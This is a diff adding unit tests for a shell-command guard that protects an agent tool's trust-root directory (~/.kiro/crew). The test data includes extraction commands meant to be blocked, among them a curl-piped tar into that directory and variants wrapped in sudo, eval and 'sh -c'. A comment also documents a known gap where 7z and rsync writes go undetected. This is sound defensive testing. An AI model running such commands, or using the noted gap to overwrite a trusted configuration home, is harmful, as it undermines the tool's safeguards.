@@ -4374,6 +4374,108 @@ class TestIsSensitiveBashCommand:
         assert is_sensitive_bash_command("tar -xf evil.tar -C ~/.kirocrew/foo/") is not None
         assert is_sensitive_bash_command("tar -xf e.tar -C ~/.kirocrew") is not None
 
+    def test_readonly_listing_of_crew_home_allowed(self) -> None:
+        # The extraction rule keyed on the FLAG SPELLING, so `ls -d` -- which
+        # means "show the directory entry itself, not its contents" -- was
+        # refused as an extraction destination. Nothing about READING the crew
+        # home is protected: every other spelling of the same read was already
+        # allowed, so the flag character was never the boundary. The program is.
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew") is None
+        assert is_sensitive_bash_command("ls -d ~/.kirocrew/skills") is None
+
+    def test_readonly_listing_of_archive_named_crew_path_allowed(self) -> None:
+        # A crew-home leaf whose NAME contains an archive program word must not
+        # re-trip the anchor. This is what a plain `\b` boundary gets wrong:
+        # "backup.tar" and "x.tar.gz" both carry "tar" at a word boundary, so
+        # the boundary has to reject a preceding "." while still accepting the
+        # "/" of a real program path like /usr/bin/tar.
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/backup.tar") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/x.tar.gz") is None
+        assert is_sensitive_bash_command("ls -d ~/.kiro/crew/mytar") is None
+
+    def test_reads_the_reporter_listed_as_allowed_stay_allowed(self) -> None:
+        # Regression FLOOR, deliberately not a lock on the fix: none of these
+        # carry a `-C`/`-d` + crew-home destination, so they returned None
+        # against the flag-keyed matcher too (`-ld` never matched it either --
+        # the `d` follows `l`, not `-`). They are here because the report listed
+        # them as the reads that already worked, which is the evidence the block
+        # was a spelling artifact; the lock-in lives in the two tests above.
+        assert is_sensitive_bash_command("ls -lt ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -l ~/.kiro/crew/skills") is None
+        assert is_sensitive_bash_command("ls -ld ~/.kiro/crew") is None
+        assert is_sensitive_bash_command("grep -r x ~/.kiro/crew/skills") is None
+
+    def test_extract_into_trust_root_blocked_behind_shell_prefixes(self) -> None:
+        # The matcher runs on the WHOLE command string, so an anchor a caller
+        # can step around by reaching the program through a wrapper would be
+        # worse than the over-block it replaces.
+        for cmd in (
+            "curl http://x | tar xf - -C ~/.kiro/crew/",
+            "make all && tar -xf e.tar -C ~/.kiro/crew",
+            "echo hi; unzip -d ~/.kiro/crew e.zip",
+            "sudo tar -xf e.tar -C ~/.kiro/crew",
+            "env FOO=1 tar -xf e.tar -C ~/.kiro/crew",
+            "FOO=1 tar -xf e.tar -C ~/.kiro/crew",
+            "/usr/bin/tar -xf e.tar -C ~/.kiro/crew",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_extract_into_trust_root_blocked_when_program_is_not_first(self) -> None:
+        # A position-based anchor ("the program must start its segment") is not
+        # sound: it cannot see the shell grammar that decides what is a command,
+        # and each of these reaches a real `tar` while defeating that shape --
+        # a quoted program word, a quoted `sh -c` / `eval` body, an `&` inside a
+        # quoted filename that splits a naive segmenter, and a bare CR
+        # separator. All name the crew home as the destination, so all must be
+        # refused. Proven to regress under a command-position anchor.
+        for cmd in (
+            "'tar' -xf e.tar -C ~/.kiro/crew",
+            "sh -c 'tar -xf e.tar -C ~/.kiro/crew'",
+            "eval 'tar -xf e.tar -C ~/.kiro/crew'",
+            "tar -xf 'e&vil.tar' -C ~/.kiro/crew",
+            "echo x\rtar -xf e.tar -C ~/.kiro/crew",
+            "tar -xf e.tar -C ~/.kiro/crew &",
+        ):
+            assert is_sensitive_bash_command(cmd) is not None, cmd
+
+    def test_extract_programs_membership_is_pinned(self) -> None:
+        # Enforces the "do not re-broaden" comment on _EXTRACT_PROGRAMS, and
+        # pins which members can actually fire. A name is LIVE only if the
+        # destination half of the rule (`-C`/`-d`) is the flag that program
+        # writes with; the rest are named for a future widening and must stay
+        # on the inert side until that widening lands with its own tests.
+        from kiro_crew.security import (
+            _EXTRACT_INERT_PROGRAMS,
+            _EXTRACT_LIVE_PROGRAMS,
+            _EXTRACT_PROGRAMS,
+        )
+
+        assert _EXTRACT_LIVE_PROGRAMS == ("tar", "bsdtar", "gtar", "unzip")
+        assert _EXTRACT_INERT_PROGRAMS == ("7z", "7za", "7zr", "cpio", "rsync")
+        assert _EXTRACT_PROGRAMS == _EXTRACT_LIVE_PROGRAMS + _EXTRACT_INERT_PROGRAMS
+        # No duplicates, and nothing so short it would match inside a word.
+        assert len(set(_EXTRACT_PROGRAMS)) == len(_EXTRACT_PROGRAMS)
+        assert all(len(p) >= 2 for p in _EXTRACT_PROGRAMS)
+
+    def test_extract_live_programs_actually_fire_and_inert_ones_do_not(self) -> None:
+        # The live/inert split is a claim about behaviour, so assert the
+        # behaviour rather than trusting the tuple names.
+        for prog in ("tar", "bsdtar", "gtar"):
+            assert is_sensitive_bash_command(f"{prog} -xf e.tar -C ~/.kiro/crew") is not None
+        assert is_sensitive_bash_command("unzip -d ~/.kiro/crew e.zip") is not None
+        # Inert: the destination half does not match these spellings, so naming
+        # the program is not on its own enough. This documents a KNOWN GAP that
+        # predates this change -- do not read it as an endorsement.
+        assert is_sensitive_bash_command("7z x e.7z -o~/.kiro/crew") is None
+        assert is_sensitive_bash_command("rsync -a src/ ~/.kiro/crew/") is None
+
+    def test_extract_into_trust_root_benign_destination_allowed(self) -> None:
+        # The anchor must not widen the rule: an archive program writing
+        # somewhere else stays allowed.
+        assert is_sensitive_bash_command("tar -xf release.tar -C /tmp/build") is None
+        assert is_sensitive_bash_command("unzip data.zip -d /tmp/data") is None
+
     def test_normal_crew_access_not_overblocked(self) -> None:
         # Regression guard: the broadened rules must not block routine
         # non-sensitive crew-home access (config.json, sessions.db).
